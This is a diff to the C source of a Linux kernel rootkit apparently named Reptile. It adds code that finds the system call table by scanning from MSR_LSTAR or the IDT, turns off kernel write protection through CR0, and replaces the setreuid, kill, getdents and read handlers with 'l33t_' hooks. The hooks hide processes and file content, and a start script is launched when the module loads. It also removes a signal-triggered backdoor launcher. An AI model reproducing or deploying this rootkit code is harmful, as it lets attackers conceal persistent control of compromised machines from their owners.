@@ -28,9 +28,7 @@
 	#include <linux/fdtable.h>
 #endif
 
-#define HEAVENSDOOR 	"/reptile/heavens_door"
-#define START 		"/reptile/start.sh"
-#define KILLDOOR 	"/reptile/kill_door.sh"
+#define START 		"/reptile/reptile_start.sh"
 #define SIGKNOCK 	48
 #define SIGHIDEPROC 	49
 #define SIGHIDEREPTILE 	50
@@ -92,19 +90,16 @@ struct task_struct *find_task(pid_t pid){
 
 int is_invisible(pid_t pid){
 	struct task_struct *task;
-	if (!pid)
-		return 0;
+	if (!pid) return 0;
 	task = find_task(pid);
-	if (!task)
-		return 0;
-	if (task->flags & 0x10000000)
-		return 1;
+	if (!task) return 0;
+	if (task->flags & 0x10000000) return 1;
 	return 0;
 }
 
 static int start_bin_from_userland(char *arg){
-	char *argv[] = { arg, NULL, NULL};
-	static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+	char *argv[] = { arg, NULL, NULL };
+	static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
 }
 
@@ -172,7 +167,84 @@ int hide_content(void *arg, int size) {
 	return newret;
 }
 
-unsigned long *find_sys_call_table(void){
+void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
+    char *p;
+
+    for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
+        if(memcmp(p, needle, needle_size) == 0) return (void *)p;
+    }
+    return NULL;
+}
+
+#if defined(x86_64) || defined(amd64)
+
+unsigned long *find_sys_call_table(void) {
+	unsigned long sct_off = 0;
+    	unsigned char code[512];
+    	char **p;
+
+    	rdmsrl(MSR_LSTAR, sct_off);
+    	memcpy(code, (void *)sct_off, sizeof(code));
+
+    	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
+  
+    	if(p) {
+        	unsigned long *table = *(unsigned long **)((char *)p + 3);
+        	table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
+        	return table;
+    	}
+    	return NULL;
+}
+
+unsigned long *ia32_find_sys_call_table(void) {
+        unsigned char *p = 0;
+        void *system_call = 0;
+        int i=0, low, high, ia32_lstar=0xC0000082;
+
+        asm("rdmsr" : "=a" (low), "=d" (high) : "c" (ia32_lstar));
+        system_call = (void*)(((long)high<<32)|low);
+        
+	for(p = system_call, i=0; i<500; i++){
+                if(p[0]==0xff && p[1]==0x14 && p[2]==0xc5)
+                        return (void*)(0xffffffff00000000 | *((unsigned int *)(p + 3)));
+                p++;
+        }
+        return NULL;
+}
+
+#elif defined(i686) || defined(i386) || defined(x86) 
+
+struct {
+	unsigned short limit;
+	unsigned long base;
+} __attribute__ ((packed))idtr;
+
+struct {
+	unsigned short off1;
+	unsigned short sel;
+    	unsigned char none, flags;
+    	unsigned short off2;
+} __attribute__ ((packed))idt;
+
+unsigned long *find_sys_call_table(void) {
+    	char **p;
+    	unsigned long sct_off = 0;
+    	unsigned char code[255];
+
+    	asm("sidt %0":"=m" (idtr));
+    	memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
+    	sct_off = (idt.off2 << 16) | idt.off1;
+    	memcpy(code, (void *)sct_off, sizeof(code));
+
+    	p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);
+
+    	if(p) return *(unsigned long **)((char *)p + 3);
+    	else return NULL;
+}
+
+#endif
+
+unsigned long *generic_find_sys_call_table(void){
 	unsigned long *syscall_table;
 	unsigned long int i;
 
@@ -211,15 +283,6 @@ asmlinkage int l33t_kill(pid_t pid, int sig){
 			if((task = find_task(pid)) == NULL) return -ESRCH;
 
 			task->flags ^= 0x10000000;
-			break;
-		case SIGKNOCK:
-			if(knockon) {
-				start_bin_from_userland(KILLDOOR);
-				knockon = 0;
-			} else {
-				start_bin_from_userland(HEAVENSDOOR);
-				knockon = 1;
-			}
 			break;
 		case SIGHIDECONTENT:
 			if(hide_file_content) hide_file_content = 0;
@@ -346,24 +409,26 @@ asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 static int __init reptile_init(void) { 
 	atomic_set(&read_on, 0);
 	sct = (unsigned long *)find_sys_call_table();
+
+#if defined(x86_64) || defined(amd64)
+	if(!sct) sct = (unsigned long *)ia32_find_sys_call_table();
+#endif
+	if(!sct) sct = (unsigned long *)generic_find_sys_call_table();			
+	if(!sct) return -1;
 	
-	if(sct) {
-    		o_setreuid = (void *)sct[__NR_setreuid];
-    		o_kill = (void *)sct[__NR_kill];
-    		o_getdents64 = (void *)sct[__NR_getdents64];
-    		o_getdents = (void *)sct[__NR_getdents];
-    		o_read = (void *)sct[__NR_read];
+	o_setreuid = (void *)sct[__NR_setreuid];
+    	o_kill = (void *)sct[__NR_kill];
+    	o_getdents64 = (void *)sct[__NR_getdents64];
+    	o_getdents = (void *)sct[__NR_getdents];
+    	o_read = (void *)sct[__NR_read];
 		
-		write_cr0(read_cr0() & (~0x10000));
-		sct[__NR_setreuid] = (unsigned long)l33t_setreuid;		
-		sct[__NR_kill] = (unsigned long)l33t_kill;		
-		sct[__NR_getdents64] = (unsigned long)l33t_getdents64;		
-		sct[__NR_getdents] = (unsigned long)l33t_getdents;		
-		sct[__NR_read] = (unsigned long)l33t_read;		
-		write_cr0(read_cr0() | 0x10000);
-	} else {
-		return -1;
-	}
+	write_cr0(read_cr0() & (~0x10000));
+	sct[__NR_setreuid] = (unsigned long)l33t_setreuid;		
+	sct[__NR_kill] = (unsigned long)l33t_kill;		
+	sct[__NR_getdents64] = (unsigned long)l33t_getdents64;		
+	sct[__NR_getdents] = (unsigned long)l33t_getdents;		
+	sct[__NR_read] = (unsigned long)l33t_read;		
+	write_cr0(read_cr0() | 0x10000);
 
 	start_bin_from_userland(START);
 
